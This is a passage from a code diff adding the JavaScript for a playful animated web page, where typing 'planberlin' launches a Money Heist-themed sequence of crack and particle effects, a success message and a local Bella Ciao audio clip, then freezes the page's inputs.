+                    imageContainer.style.right = '-500px';
+                    imageContainer.style.transition = 'all 3s ease-out';
+                    
+                    setTimeout(() => {
+                        imageContainer.style.right = '10%';
+                        console.log('🖼️ Image flying in');
+                    }, 100);
+                }
+            }, 2500);
+            
+            // Step 5: Skip connection line (removed)
+            // Connection line is now hidden
+            
+            // Step 6: Show success message
+            setTimeout(() => {
+                const successMessage = document.getElementById('successMessage');
+                if (successMessage) {
+                    successMessage.style.display = 'block';
+                    successMessage.style.opacity = '0';
+                    successMessage.style.transition = 'opacity 2s ease';
+                    
+                    setTimeout(() => {
+                        successMessage.style.opacity = '1';
+                        console.log('🎆 SUCCESS MESSAGE DISPLAYED!');
+                        
+                        // Play Bella Ciao music after success message appears
+                        playBellaCiao();
+                    }, 100);
+                }
+                
+                // Create celebration particles
+                createCelebrationParticles();
+            }, 6000);
+            
+            // Disable interactions
+            setTimeout(() => {
+                document.body.classList.add('frozen');
+                const inputs = document.querySelectorAll('input, button');
+                inputs.forEach(input => {
+                    input.disabled = true;
+                    input.style.opacity = '0.3';
+                });
+            }, 1000);
+        }
+        
+        // Create celebration particles
+        function createCelebrationParticles() {
+            const container = document.getElementById('particleBurst');
+            if (!container) return;
+            
+            for (let i = 0; i < 30; i++) {
+                setTimeout(() => {
+                    const particle = document.createElement('div');
+                    particle.style.cssText = `
+                        position: absolute;
+                        width: 10px;
+                        height: 10px;
+                        background: radial-gradient(circle, #FFD700, transparent);
+                        border-radius: 50%;
+                        left: ${Math.random() * 100}%;
+                        top: ${Math.random() * 100}%;
+                        animation: burstParticleFloat 3s ease-out forwards;
+                        box-shadow: 0 0 15px #FFD700;
+                    `;
+                    
+                    container.appendChild(particle);
+                    setTimeout(() => particle.remove(), 3000);
+                }, i * 100);
+            }
+        }
+        
+        // Play Bella Ciao music function
+        function playBellaCiao() {
+            try {
+                console.log('🎵 Playing Bella Ciao music...');
+                
+                // Create audio element - file is now in the same folder
+                const audio = new Audio('./bella ciao.mp3');
+                
+                // Set audio properties
+                audio.volume = 0.7; // 70% volume
+                audio.loop = false; // Play once
+                
+                // Add event listeners
+                audio.addEventListener('loadstart', () => {
+                    console.log('🎵 Loading Bella Ciao...');
+                });
+                
+                audio.addEventListener('canplay', () => {
+                    console.log('🎵 Bella Ciao ready to play');
+                });
+                
+                audio.addEventListener('play', () => {
+                    console.log('🎵 Bella Ciao started playing!');
+                });
+                
+                audio.addEventListener('ended', () => {
+                    console.log('🎵 Bella Ciao finished playing');
+                });
+                
+                audio.addEventListener('error', (e) => {
+                    console.error('⚠️ Error playing Bella Ciao:', e);
+                    console.log('Trying alternative naming...');
+                    
+                    // Try alternative naming variations
+                    const altAudio = new Audio('./bella-ciao.mp3');
+                    altAudio.volume = 0.7;
+                    altAudio.play().catch(err => {
+                        console.error('⚠️ Alternative naming also failed:', err);
+                        
+                        // Try without space
+                        const altAudio2 = new Audio('./bellaciao.mp3');
+                        altAudio2.volume = 0.7;
+                        altAudio2.play().catch(err2 => {
+                            console.error('⚠️ All audio paths failed:', err2);
+                        });
+                    });
+                });
+                
+                // Try to play the audio
+                audio.play().catch(error => {
+                    console.error('⚠️ Failed to play Bella Ciao:', error);
+                    console.log('Note: Browser may require user interaction to play audio');
+                });
+                
+            } catch (error) {
+                console.error('⚠️ Error creating audio:', error);
+            }
+        }
+
+        // Start the crack discovery animation
+        function startCrackDiscoveryAnimation() {
+            console.log('Starting crack discovery animation');
+            const discoveryScreen = document.getElementById('crackDiscovery');
+            discoveryScreen.classList.add('active');
+            
+            // Create discovery cracks
+            createDiscoveryCracks();
+            
+            // Create golden particle explosion
+            createGoldenParticleExplosion();
+        }
+
+        // Create discovery cracks with golden effect
+        function createDiscoveryCracks() {
+            const container = document.getElementById('crackDiscovery');
+            
+            // Create multiple golden cracks from center
+            const crackPoints = [
+                { x: 50, y: 50, angle: 0, length: 300 },
+                { x: 50, y: 50, angle: 45, length: 250 },
+                { x: 50, y: 50, angle: 90, length: 280 },
+                { x: 50, y: 50, angle: 135, length: 220 },
+                { x: 50, y: 50, angle: 180, length: 300 },
+                { x: 50, y: 50, angle: 225, length: 240 },
+                { x: 50, y: 50, angle: 270, length: 290 },
+                { x: 50, y: 50, angle: 315, length: 260 }
+            ];
+            
+            crackPoints.forEach((point, index) => {
+                setTimeout(() => {
+                    const crack = document.createElement('div');
+                    crack.className = 'discovery-crack';
+                    
+                    crack.style.left = point.x + '%';
+                    crack.style.top = point.y + '%';
+                    crack.style.width = '4px';
+                    crack.style.transform = `rotate(${point.angle}deg)`;
+                    crack.style.setProperty('--discovery-crack-height', point.length + 'px');
+                    crack.style.animationDelay = (index * 0.1) + 's';
+                    
+                    container.appendChild(crack);
+                    
+                    // Create branch cracks
+                    setTimeout(() => {
+                        for (let i = 0; i < 2; i++) {
+                            const branch = document.createElement('div');
+                            branch.className = 'discovery-crack';
+                            
+                            const branchAngle = point.angle + (Math.random() - 0.5) * 60;
+                            const branchLength = point.length * (0.4 + Math.random() * 0.3);
+                            const branchOffset = point.length * (0.3 + Math.random() * 0.4);
+                            
+                            const offsetX = Math.cos(point.angle * Math.PI / 180) * branchOffset / 10;
+                            const offsetY = Math.sin(point.angle * Math.PI / 180) * branchOffset / 10;
+                            
+                            branch.style.left = (point.x + offsetX) + '%';
+                            branch.style.top = (point.y + offsetY) + '%';
+                            branch.style.width = '2px';
+                            branch.style.transform = `rotate(${branchAngle}deg)`;
+                            branch.style.setProperty('--discovery-crack-height', branchLength + 'px');
+                            branch.style.animationDelay = (i * 0.3) + 's';
+                            
+                            container.appendChild(branch);
+                        }
+                    }, 500);
+                }, index * 200);
+            });
+        }
+
+        // Create golden particle explosion
+        function createGoldenParticleExplosion() {
+            const container = document.getElementById('goldenParticles');
+            
+            // Create particles emanating from center
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const particle = document.createElement('div');
+                    particle.className = 'golden-particle';
+                    
+                    const angle = (i / 50) * 360;
+                    const distance = Math.random() * 200 + 100;
+                    
+                    particle.style.left = '50%';
+                    particle.style.top = '50%';
+                    particle.style.width = Math.random() * 15 + 8 + 'px';
+                    particle.style.height = particle.style.width;
+                    particle.style.animationDelay = (i * 0.05) + 's';
+                    
+                    // Set particle direction
+                    particle.style.setProperty('--particle-x', Math.cos(angle * Math.PI / 180) * distance + 'px');
+                    particle.style.setProperty('--particle-y', Math.sin(angle * Math.PI / 180) * distance + 'px');
+                    
+                    container.appendChild(particle);
+                    
+                    setTimeout(() => particle.remove(), 4000);
+                }, i * 30);
+            }
+        }
+
+        // Show the enhanced Plan Berlin screen with cinematic sequence
+        function showPlanBerlinScreen() {
+            // Hide discovery screen first
+            document.getElementById('crackDiscovery').classList.remove('active');
+            
+            // Start cinematic sequence
+            startCinematicSequence();
+        }
+
+        // Start the amazing cinematic sequence
+        function startCinematicSequence() {
+            console.log('Starting cinematic sequence');
+            const cinematicOverlay = document.getElementById('cinematicOverlay');
+            
+            // Make sure the overlay exists
+            if (!cinematicOverlay) {
+                console.error('Cinematic overlay not found!');
+                return;
+            }
+            
+            // Step 1: Show black overlay and erase everything (immediate)
+            cinematicOverlay.style.display = 'block';
+            cinematicOverlay.classList.add('active');
+            console.log('Cinematic overlay activated');
+            
+            // Step 2: Start eraser wave effect
+            setTimeout(() => {
+                console.log('Starting eraser wave');
+                const eraserWave = document.getElementById('eraserWave');
+                if (eraserWave) {
+                    eraserWave.style.display = 'block';
+                }
+            }, 500);
+            
+            // Step 3: Start portrait and image flying in from opposite sides
+            setTimeout(() => {
+                console.log('Flying in portrait and image');
+                const portraitContainer = document.getElementById('portraitContainer');
+                const imageContainer = document.getElementById('imageContainerCinematic');
+                
+                if (portraitContainer) {
+                    portraitContainer.style.display = 'block';
+                    portraitContainer.classList.add('active');
+                }
+                if (imageContainer) {
+                    imageContainer.style.display = 'block';
+                    imageContainer.classList.add('active');
+                }
+                
+                // Add particle burst effect
+                createParticleBurst();
+            }, 1500);
+            
+            // Step 4: Show connection line
+            setTimeout(() => {
+                console.log('Showing connection line');
+                const connectionLine = document.getElementById('connectionLine');
+                if (connectionLine) {
+                    connectionLine.style.display = 'block';
+                }
+            }, 4000);
+            
+            // Step 5: Show success message
+            setTimeout(() => {
+                console.log('Showing success message');
+                const successMessage = document.getElementById('successMessage');
+                if (successMessage) {
+                    successMessage.style.display = 'block';
+                }
+                
+                // Add final particle explosion
+                createFinalExplosion();
+            }, 5000);
+            
+            // Final step: Disable all interactions permanently
+            document.body.classList.add('frozen');
+            const inputs = document.querySelectorAll('input, button, textarea, select');
+            inputs.forEach(input => {
+                input.disabled = true;
+                input.style.cursor = 'not-allowed';
+                input.style.opacity = '0.3';
+            });
+        }
+
+        // Create particle burst effect
+        function createParticleBurst() {
+            const container = document.getElementById('particleBurst');
+            
+            // Create particles bursting from center
+            for (let i = 0; i < 30; i++) {
+                setTimeout(() => {
+                    const particle = document.createElement('div');
+                    particle.className = 'burst-particle';
+                    
+                    const angle = (i / 30) * 360;
+                    const distance = Math.random() * 300 + 100;
+                    
+                    particle.style.left = '50%';
+                    particle.style.top = '50%';
+                    particle.style.animationDelay = (i * 0.1) + 's';
+                    
+                    // Set random direction
+                    const x = Math.cos(angle * Math.PI / 180) * distance;
+                    const y = Math.sin(angle * Math.PI / 180) * distance;
+                    
+                    particle.style.setProperty('--burst-x', x + 'px');
+                    particle.style.setProperty('--burst-y', y + 'px');
+                    
+                    container.appendChild(particle);
+                    
+                    setTimeout(() => particle.remove(), 3000);
+                }, i * 50);
+            }
+        }
+
+        // Create final explosion effect
+        function createFinalExplosion() {
+            const container = document.getElementById('particleBurst');
+            
+            // Create massive particle explosion
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const particle = document.createElement('div');
+                    particle.className = 'burst-particle';
+                    
+                    particle.style.left = Math.random() * 100 + '%';
+                    particle.style.top = Math.random() * 100 + '%';
+                    particle.style.background = `radial-gradient(circle, hsl(${Math.random() * 60 + 30}, 90%, 70%), transparent)`;
+                    particle.style.width = Math.random() * 15 + 10 + 'px';
+                    particle.style.height = particle.style.width;
+                    particle.style.animationDelay = (i * 0.05) + 's';
+                    
+                    container.appendChild(particle);
+                    
+                    setTimeout(() => particle.remove(), 3000);
+                }, i * 30);
+            }
+            
+            // Add golden sparkles
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    const sparkle = document.createElement('div');
+                    sparkle.style.cssText = `
+                        position: absolute;
+                        width: 12px;
+                        height: 12px;
+                        background: radial-gradient(circle, #FFD700, transparent);
+                        border-radius: 50%;
+                        left: ${Math.random() * 100}%;
+                        top: ${Math.random() * 100}%;
+                        animation: burstParticleFloat 4s ease-out forwards;
+                        box-shadow: 0 0 20px #FFD700;
+                    `;
+                    
+                    container.appendChild(sparkle);
+                    
+                    setTimeout(() => sparkle.remove(), 4000);
+                }, i * 100);
+            }
+        }
+
+        // Create enhanced Plan Berlin sparkle effect
+        function createEnhancedPlanBerlinSparkles() {
+            const sparkleContainer = document.getElementById('planberlinSparkles');
+            
+            function addSparkle() {
+                const sparkle = document.createElement('div');
+                sparkle.className = 'planberlin-sparkle';
+                sparkle.style.left = Math.random() * 100 + '%';
+                sparkle.style.background = `hsl(${Math.random() * 60 + 30}, 90%, 70%)`; // Gold-ish colors
+                sparkle.style.animationDelay = Math.random() * 3 + 's';
+                sparkle.style.width = Math.random() * 12 + 6 + 'px';
+                sparkle.style.height = sparkle.style.width;
+                sparkle.style.boxShadow = `0 0 20px ${sparkle.style.background}`;
+                sparkleContainer.appendChild(sparkle);
+                
+                setTimeout(() => sparkle.remove(), 3000);
+            }
+            
+            // Create continuous enhanced sparkles
+            setInterval(addSparkle, 200);
+        }
+
+        // Allow Enter key to create heart cloud
+        document.getElementById('textInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !isShattered) {
+                // Check for Plan Berlin trigger on Enter key
+                const text = document.getElementById('textInput').value.trim();
+                if (text.toLowerCase() === 'planberlin') {
+                    activatePlanBerlin();
+                } else {
+                    createHeartCloud();
+                }
+            }
+        });
+
+        // Initialize enhanced background particles
+        createBackgroundParticles();
+
+        // Add more frequent ambient sparkles
+        setInterval(() => {
+            if (!isShattered) createSparkles();
+        }, 5000);
+
+        // Add some automatic heart clouds for demo
+        setTimeout(() => {
+            document.getElementById('textInput').value = 'Welcome to Heart Cloud Dreams';
+            createHeartCloud();
+        }, 2000);
+    </script>
+</body>
+</html>
